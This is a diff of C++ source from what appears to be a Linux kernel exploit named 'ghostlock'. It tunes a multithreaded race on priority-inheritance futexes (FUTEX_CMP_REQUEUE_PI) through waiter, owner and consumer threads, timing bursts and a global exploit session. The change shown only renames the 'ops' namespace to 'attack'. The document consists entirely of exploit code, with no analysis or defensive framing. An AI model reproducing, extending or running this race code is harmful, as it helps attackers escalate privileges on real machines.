@@ -27,7 +27,7 @@ namespace ghostlock::race {
             pr_error("waiter lock chain errno=%d\n", errno);
         race->waiter_ready.store(1);
         while (!race->owner_started.load())
-            usleep(ops::execution_settings()->race_state_poll_interval_us);
+            usleep(attack::execution_settings()->race_state_poll_interval_us);
         struct timespec timeout;
         SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
         if (race->fast_repair.load()) {
@@ -38,7 +38,7 @@ namespace ghostlock::race {
             }
         } else {
             uint64_t wait_ns =
-                    (uint64_t) ops::execution_settings()->race_route_wait_ms * 1000000ULL;
+                    (uint64_t) attack::execution_settings()->race_route_wait_ms * 1000000ULL;
             timeout.tv_sec += (time_t)(wait_ns / 1000000000ULL);
             timeout.tv_nsec += (long) (wait_ns % 1000000000ULL);
             if (timeout.tv_nsec >= 1000000000L) {
@@ -75,7 +75,7 @@ namespace ghostlock::race {
         race->route_done.store(1);
         support::futex_op(&race->chain_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
         while (!race->owner_chain_done.load())
-            usleep(ops::execution_settings()->race_state_poll_interval_us);
+            usleep(attack::execution_settings()->race_state_poll_interval_us);
         return nullptr;
     }
 
@@ -87,7 +87,7 @@ namespace ghostlock::race {
         if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
         while (!race->waiter_ready.load() &&
                !race->owner_stop.load())
-            usleep(ops::execution_settings()->race_state_poll_interval_us);
+            usleep(attack::execution_settings()->race_state_poll_interval_us);
         if (race->owner_stop.load()) {
             if (lock_target == 0)
                 support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, nullptr, nullptr, 0);
@@ -124,7 +124,7 @@ namespace ghostlock::race {
                 int delay_usec = race->route_delay_usec.load();
                 if (delay_usec > 0) usleep((useconds_t) delay_usec);
                 for (uint32_t burst = 0;
-                     burst < ops::execution_settings()->select_consumer_burst_calls; burst++) {
+                     burst < attack::execution_settings()->select_consumer_burst_calls; burst++) {
                     if (race->consumer_stop.load() ||
                         race->consumer_go.load() != seq)
                         break;
@@ -151,7 +151,7 @@ namespace ghostlock::race {
                     race->consumer_inflight.store(0);
                     calls_this_seq++;
                     if ((uint32_t) calls_this_seq >=
-                        ops::execution_settings()->select_consumer_max_calls) {
+                        attack::execution_settings()->select_consumer_max_calls) {
                         race->consumer_go.store(0);
                         break;
                     }
@@ -164,7 +164,7 @@ namespace ghostlock::race {
     void reset_main_route_state(void) {
         int fast_repair = g_exploit_session.race.fast_repair.load();
         g_exploit_session.race.reset(
-            fast_repair ? 5000 : (int) ops::execution_settings()->select_enter_delay_us,
+            fast_repair ? 5000 : (int) attack::execution_settings()->select_enter_delay_us,
             runtime_config_snapshot().main_cpu, runtime_config_snapshot().consumer_cpu);
         g_exploit_session.race.fast_repair.store(fast_repair);
     }
@@ -175,11 +175,11 @@ namespace ghostlock::race {
  * lives in outcome_with_counters() and TODO(pi-timeout-01). */
 RouteStatus PiRace::run() noexcept {
     while (!waiter_waiting.load() || !owner_started.load())
-        usleep(ops::execution_settings()->race_state_poll_interval_us);
+        usleep(attack::execution_settings()->race_state_poll_interval_us);
     pr_info("[route] waiter parked; owner started\n");
     usleep(fast_repair.load()
                ? 5000
-               : ops::execution_settings()->race_setup_settle_us);
+               : attack::execution_settings()->race_setup_settle_us);
     errno = 0;
     long rq = support::futex_op(&wait_futex, FUTEX_CMP_REQUEUE_PI, 1,
                                 reinterpret_cast<void *>(1),
@@ -192,7 +192,7 @@ RouteStatus PiRace::run() noexcept {
      * never disarmed. Bound the wait from TargetProfile.execution and map a
      * timeout to ROUTE_DIRTY_FAILURE instead of looping indefinitely. */
     while (!route_done.load())
-        usleep(ops::execution_settings()->race_state_poll_interval_us);
+        usleep(attack::execution_settings()->race_state_poll_interval_us);
     const RouteStatus status = route_status;
     const int calls = consumer_calls.load();
     const int success = consumer_success.load();
